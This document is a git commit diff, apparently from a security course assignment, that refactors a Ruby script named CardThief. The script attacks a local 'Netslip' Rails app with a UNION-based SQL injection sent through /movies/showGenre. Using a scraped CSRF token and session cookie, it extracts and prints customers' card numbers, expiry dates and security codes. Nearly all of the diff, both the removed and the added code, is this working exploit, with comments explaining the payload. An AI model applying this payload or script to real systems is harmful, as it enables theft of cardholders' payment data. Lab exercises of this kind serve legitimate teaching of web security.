594a6983e9e1cdd62e825cdf420b3eb0e335b283
Rafael Moreno Ferrer <rmferrer@gmail.com>
2013-06-03 20:33:04 -0700

    PA8: refactored cardInfo.rb

--- pa8/p2/cardInfo.rb
+++ pa8/p2/cardInfo.rb
@@ -1,75 +1,137 @@
-# SELECT * FROM movies WHERE genre='' AND 1=0 UNION SELECT name, card_number, security_code, exp_month, exp_year, billing_street, billing_city FROM customers UNION SELECT * FROM movies WHERE 1=0 AND genre='' ORDER BY title;
-# SELECT * FROM movies WHERE genre='' ORDER BY title;
-#' AND 1=0 UNION SELECT name, card_number, security_code, exp_month, exp_year, billing_street, billing_city FROM customers UNION SELECT * FROM movies WHERE 1=0 AND genre='
-
 require 'socket'
 require 'cgi'
 
-host = "localhost"
-port = 3000
+class CreditCard
+	attr_reader :customer_name, :card_number, :exp_month, :exp_year, :sec_code
 
-request = "GET /movies/selectGenre HTTP/1.1\n" \
-		  "Connection: close\n" \
-		  "Host: localhost:3000\n" \
-		  "\r\n"
-
-s = TCPSocket.open(host, port)
-
-s.puts request
-response = s.read
-
-
-if response =~ /<input name="authenticity_token" type="hidden" value="(.*)" \/>/
-	auth_token = $1  
-else
-	# TODO: handle error
+	def initialize(args)
+		@customer_name = args[:customer_name]
+		@card_number = args[:card_number]
+		@exp_month = args[:exp_month]
+		@exp_year = args[:exp_year]
+		@sec_code = args[:sec_code]
+	end
 end
 
-if response =~ /^Set-Cookie: _session_id=([a-zA-Z0-9]*);/
-	cookie = $1
-else
-	# TODO: handle error
+class CardThief
+
+	#### Public interface ####
+
+	public
+
+	def initialize
+		@@host = "localhost"
+		@@port = 3000
+	end
+
+	# This method prints out the credit card info for each credit card stored
+	# in the Netslip customer database table
+	def printCreditCardInfo()
+		stealCreditCardInfo().each_with_index do |card, i|
+			puts "Card #" + i.to_s + "\n"
+			puts "Customer Name:\t\t" + card.customer_name
+			puts "Credit Card Number:\t" + card.card_number
+			puts "Expiration date:\t" + card.exp_month + "/" + card.exp_year
+			puts "3-digit security code:\t" + card.sec_code + "\n\n"
+		end
+	end
+
+
+	##### Private helper methods #####
+
+	private 
+
+	# This method returns an array of CreditCard objects.
+	#
+	# It calls fetchRawCreditCardInfo to get the raw
+	# info from the Netslip server, parses out the credit card
+	# info into an array of CreditCard objects.
+	def stealCreditCardInfo()
+		card_info_regex = /<td><a href="\/movies\/rent\/\d+">(.*)<\/a><\/td>\n *<td>([0-9]*)<\/td>\n *<td>([0-9]*)<\/td>\n *<td>([0-9]*)<\/td>\n *<td>([0-9]*)<\/td>/
+
+		raw_card_info = fetchRawCreditCardInfo()
+		
+		# parse out credit card information from the raw HTTP response and put
+		# it into the customer_info array. Each credit card's info is stored
+		# into cutomer_info as an array of size 5:
+		#    first item is the customer name, 
+		#    second item is the credit card number, 
+		#    third item is the expiration month, 
+		#    fourth item is the expiration year, 
+		#    fifth item is the 3-digit security code, 
+		nice_card_info = []
+
+		raw_card_info.scan(card_info_regex) do |c|
+			card_info = {customer_name: c[0], card_number: c[1], exp_month: c[2], exp_year: c[3], sec_code: c[4]}
+			nice_card_info << CreditCard.new(card_info)
+		end
+		
+		return nice_card_info
+	end
+
+	# This function returns the raw HTTP response with the credit card
+	# information from the NetSlip server.
+	def fetchRawCreditCardInfo
+		# This is the payload for the SQL query. This is the heart of the SQL injection attack
+		# Basically it closes off the ongoing query and inserts a query for the credit cards in the middle.
+		# UNION makes sure we get the results for all of these queries together. Note that by putting the
+		# condition 1=0 the queries surrounding the credit card query we make sure that these don't return 
+		# any results and we only get the credit card results.
+		egg = "' AND 1=0 UNION SELECT billing_street, name, card_number, exp_month, exp_year, security_code, billing_city FROM customers UNION SELECT * FROM movies WHERE 1=0 AND genre='"
+
+	    # get the CSRF auth token and the session cookie to put into the POST request
+		token_and_cookie = getAuthTokenAndSessionCookie()
+		auth_token = token_and_cookie[0]; session_cookie = token_and_cookie[1];
+
+	    # put the authenticity token as well as the SQL injection payload 
+	    # as url encoded parameters to the HTTP POST request 
+		request_body = "authenticity_token=" + CGI::escape(auth_token) + "&" \
+		   "genre=" + CGI::escape(egg) + "&" \
+		   "commit=Show+Movies"
+
+		# construct the full HTTP POST request for the showGenre action in the movies_controller
+		# this is the action that has the vulnerability
+		http_request = "POST /movies/showGenre HTTP/1.1\r\n" \
+			  "Host: " + @@host + ":" + @@port.to_s + "\r\n" \
+			  "Connection: close\r\n" \
+			  "Content-Type: application/x-www-form-urlencoded\r\n" \
+			  "Content-Length: " + request_body.size.to_s + "\r\n" \
+			  "Cookie: _session_id=" + session_cookie + "\r\n" \
+			  "\r\n"
+		http_request += request_body
+
+		# send HTTP request and get response 		  
+		s = TCPSocket.open(@@host, @@port)
+		s.puts http_request
+		http_response = s.read
+
+		return http_response
+	end
+
+	def getAuthTokenAndSessionCookie
+		auth_token_regex = /<input name="authenticity_token" type="hidden" value="(.*)" \/>/ 
+		session_cookie_regex = /^Set-Cookie: _session_id=([a-zA-Z0-9]*);/
+
+		# HTTP request for select genre page
+		http_request = "GET /movies/selectGenre HTTP/1.1\r\n" \
+				  "Connection: close\r\n" \
+				  "Host: " + @@host + ":" + @@port.to_s + "\r\n" \
+				  "\r\n"
+
+		# send HTTP request and get response 		  
+		s = TCPSocket.open(@@host, @@port)
+		s.puts http_request
+		http_response = s.read
+
+		# parse out the CSRF authenticity token and the unauthenticated session cookie
+		auth_token = (http_response =~ auth_token_regex) ? $1 : nil
+		session_cookie = (http_response =~ session_cookie_regex) ? $1 : nil
+
+		return [auth_token, session_cookie]
+	end
+
 end
 
 
-egg = "' AND 1=0 UNION SELECT billing_street, name, card_number, exp_month, exp_year, security_code, billing_city FROM customers UNION SELECT * FROM movies WHERE 1=0 AND genre='"
-
-body = "authenticity_token=" + CGI::escape(auth_token) + "&" \
-	   "genre=" + CGI::escape(egg) + "&" \
-	   "commit=Show+Movies"
-
-request2 = "POST /movies/showGenre HTTP/1.1\n" \
-		  "Host: localhost:3000\n" \
-		  "Connection: close\n" \
-		  "Content-Type: application/x-www-form-urlencoded\n" \
-		  "Content-Length: " + body.size.to_s + "\n" \
-		  "Cookie: _session_id=" + cookie + "\n" \
-		  "\r\n"
-
-
-request2 += body
-
-s2 = TCPSocket.open(host, port)
-
-s2.puts request2
-response2 = s2.read
-
-
-customer_info = []
-
-regex_cc = /<td><a href="\/movies\/rent\/0">([0-9]*)<\/a><\/td>/
-regex = /<td><a href="\/movies\/rent\/\d+">(.*)<\/a><\/td>\n *<td>([0-9]*)<\/td>\n *<td>([0-9]*)<\/td>\n *<td>([0-9]*)<\/td>\n *<td>([0-9]*)<\/td>/
-
-response2.scan(regex) {|e| customer_info << e}
-
-customer_info.each_with_index do |customer, i|
-	puts "Customer #" + i.to_s + "\n"
-	puts "Name:\t\t\t" + customer[0]
-	puts "Credit Card Number:\t" + customer[1]
-	puts "Expiration date:\t" + customer[2] + "/" + customer[3]
-	puts "3-digit security code:\t" + customer[4] + "\n\n"
-end
-
-
-# TODO: cleanup and comment
-
+t = CardThief.new()
+t.printCreditCardInfo()
